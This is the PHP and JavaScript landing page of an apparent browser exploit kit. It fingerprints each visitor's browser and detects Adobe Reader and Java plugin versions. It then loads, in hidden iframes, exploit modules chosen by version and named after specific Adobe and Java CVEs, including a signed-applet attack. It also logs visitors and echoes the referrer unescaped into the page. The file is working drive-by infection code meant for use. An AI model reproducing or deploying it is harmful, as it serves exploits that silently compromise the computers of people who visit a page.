<?


include_once('config.php');

include("include/browser.php");

$browser = new Browser();
$data = $browser->identification();

if(($data['browser'] != "FIREFOX" && $data['browser'] != "CHROME" && $data['browser'] != "SAFARI" && $data['browser'] != "OPERA" && $data['browser'] != "MSIE") || $data['platform'] == "OTHER"){
	exit();
}

?>
<body>

<? 
if($reuse_iframe){
	echo "<iframe id='reuse_frame'></iframe>";
}
?>

</body>
<script type="text/javascript" src="include/PluginDetect.js"></script>
<script type="text/javascript">

function getVersion(str){

	if(str=="Acrobat"){

		var a_version=new Object();
		a_version.exists=false;
		a_version.version='0';
		
		var a_detect = PluginDetect.getVersion("AdobeReader");
		if(a_detect!=null){
			a_version.exists=true;
			var vArray = a_detect.split(",");
			a_version.version = vArray[0] + vArray[1] + vArray[2];
		}	
		return a_version;

	}
	if(str=="Java"){
		var j_version=new Object();
		j_version.exists=false;
		j_version.version='0';
		j_version.build='0';
		
		var j_detect = PluginDetect.getVersion('Java', 'include/getJavaInfo.jar')

		if(j_detect!=null){
			j_version.exists=true;
			var vArray = j_detect.split(",");
			j_version.version = vArray[1];
			j_version.build = vArray[3];
		}	
		return j_version;		
	}

}

var FramesArray = new Array();
var CurrentModule = 0;

function InitializeVisitor(){	
	var newDIV = document.createElement("div");
	newDIV.innerHTML = "<iframe src='add_visitor.php?referrer=<? echo getenv('HTTP_REFERER'); ?>'></iframe>";	
	document.body.appendChild(newDIV);	
}

function NextModule(){

	<? 
	if($reuse_iframe){
	?>
	document.getElementById('reuse_frame').src = FramesArray[CurrentModule];
	<?
	}else{
	?>
	var newDIV=document.createElement("div");
	newDIV.innerHTML="<iframe src='" + FramesArray[CurrentModule] + "'></iframe>";	
	document.body.appendChild(newDIV);
	<?
	}
	?>

	if(CurrentModule < FramesArray.length - 1){
		CurrentModule++;
		setTimeout("NextModule()", <? echo $exploit_delay; ?>);
	}
}

function AcrobatModule(){
	var a_version = getVersion("Acrobat");
	if(a_version.exists){	
		if(a_version.version >= 800 && a_version.version < 821){
			FramesArray.push("load_module.php?e=Adobe-80-2010-0188");			
		}else if(a_version.version >= 900 && a_version.version < 940){
			if(a_version.version < 931){				
				FramesArray.push("load_module.php?e=Adobe-90-2010-0188");
			}else if(a_version.version < 933){		
				FramesArray.push("load_module.php?e=Adobe-2010-1297");

			}else if(a_version.version < 940){		
				FramesArray.push("load_module.php?e=Adobe-2010-2884");
			}	
		}else if(a_version.version >= 700 && a_version.version < 711){
			FramesArray.push("load_module.php?e=Adobe-2008-2992");
		}
	}	
}
function JavaModule(){
	var j_version = getVersion("Java");
	if(j_version.exists){	
		if(j_version.version < 6 || (j_version.version == 6 && j_version.build < 19)){
			FramesArray.push("load_module.php?e=Java-2010-0842");
		
<?
if($data['browser'] == "MSIE"){
?>

		}else if(j_version.version == 6 && j_version.build < 22){
			FramesArray.push("load_module.php?e=Java-2010-3552");

<?
}
?>
		
		}
	}	
}
function SignedModule(){
	var j_version = getVersion("Java");
	if(j_version.exists){	
		FramesArray.push("load_module.php?e=JavaSignedApplet");
	}
}

InitializeVisitor();

JavaModule();

AcrobatModule();

<? if($enable_signed) echo "SignedModule();"; ?>

if(FramesArray.length > 0){
	NextModule();
}

</script>
